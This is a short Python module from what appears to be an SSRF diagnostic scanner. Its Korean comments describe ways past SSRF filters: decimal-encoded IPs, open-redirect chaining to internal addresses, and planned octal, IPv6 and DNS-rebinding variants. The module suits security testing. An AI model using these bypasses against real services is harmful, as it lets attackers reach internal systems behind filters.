"""
diagnosis/bypass.py
SSRF 필터 우회 기법 모음

- 각 함수는 "원본 타겟(예: 127.0.0.1)"을 받아서
  필터를 우회할 수 있는 "변형된 URL 후보"를 만들어 반환합니다.
- scanner.py 에서 이 함수들을 순서대로 시도합니다.
- 새로운 우회 기법을 추가할 때는 함수만 추가하고 BYPASS_TECHNIQUES 리스트에 등록하면 됩니다.
  (8진수, IPv6, DNS 리바인딩 등 추후 확장 지점)
"""


def bypass_decimal_ip(target_ip: str) -> str:
    """
    IP 주소를 10진수 정수로 변환하여 우회하는 기법.
    예: 127.0.0.1 -> 2130706433
    필터가 점(.)이 포함된 문자열만 체크할 때 우회 가능합니다.
    """
    parts = target_ip.split(".")
    if len(parts) != 4:
        raise ValueError("IPv4 주소 형식이 아닙니다 (예: 127.0.0.1)")

    decimal_value = (
        int(parts[0]) * 256 ** 3
        + int(parts[1]) * 256 ** 2
        + int(parts[2]) * 256
        + int(parts[3])
    )
    return f"http://{decimal_value}/"


def bypass_redirect(redirect_target_url: str, open_redirect_endpoint: str) -> str:
    """
    오픈 리다이렉트를 이용한 우회 기법.
    필터가 최초 요청 URL만 검사하고, 서버가 따라가는 리다이렉트 대상은
    검사하지 않는 경우를 노립니다.

    open_redirect_endpoint: 우리가 통제 가능한(혹은 취약한) 리다이렉트 엔드포인트
    redirect_target_url: 최종적으로 도달하고 싶은 내부 주소
    """
    return f"{open_redirect_endpoint}?redirect_to={redirect_target_url}"


# TODO: 추후 확장 기법
# def bypass_octal_ip(target_ip: str) -> str:
#     """8진수 IP 변환 우회. 예: 127.0.0.1 -> 0177.0000.0000.0001"""
#     pass

# def bypass_ipv6(target_ip: str) -> str:
#     """IPv6 매핑 주소를 이용한 우회. 예: 127.0.0.1 -> ::ffff:127.0.0.1"""
#     pass

# def bypass_dns_rebinding(domain: str) -> str:
#     """DNS 리바인딩을 이용한 우회."""
#     pass


# scanner.py 가 순회할 우회 기법 목록
# 각 항목은 (기법 이름, 함수) 튜플로 구성합니다.
BYPASS_TECHNIQUES = [
    ("decimal_ip", bypass_decimal_ip),
    ("redirect", bypass_redirect),
    # ("octal_ip", bypass_octal_ip),        # 추가 시 주석 해제
    # ("ipv6", bypass_ipv6),
    # ("dns_rebinding", bypass_dns_rebinding),
]